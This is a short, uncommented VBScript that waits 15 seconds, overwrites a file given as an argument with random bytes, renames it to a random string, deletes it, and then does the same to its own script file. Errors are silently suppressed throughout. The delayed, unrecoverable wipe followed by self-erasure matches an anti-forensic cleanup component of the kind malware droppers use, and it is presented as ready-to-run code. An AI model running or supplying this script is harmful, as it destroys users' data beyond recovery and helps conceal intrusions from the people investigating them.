On Error Resume Next
Function rsf(ByVal filePath)
    On Error Resume Next
    Dim fso, fd, i, b, nn
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.GetFile(filePath)
    fsize = file.size
    Set fd = fso.OpenTextFile(filePath, 2, False, -2)
    Randomize Hour(Now) * Minute(Now) * Second(Now)
    for i = 1 to fsize
        fd.write Chr(CInt(Rnd * 255))
    next
    fd.Close
    b=""
    for i=0 to 16
        if i=10 then: b = b & "."
        b = b & CStr(CInt(Rnd * 256))
    next
    file.Name = b
    file.Delete(True)
End Function
Set objArgs = WScript.Arguments
If objArgs.Count = 0 then
     Wscript.Quit 0
end if
WScript.Sleep 15000
fp = objArgs(0)
rsf fp
rsf WScript.ScriptFullName
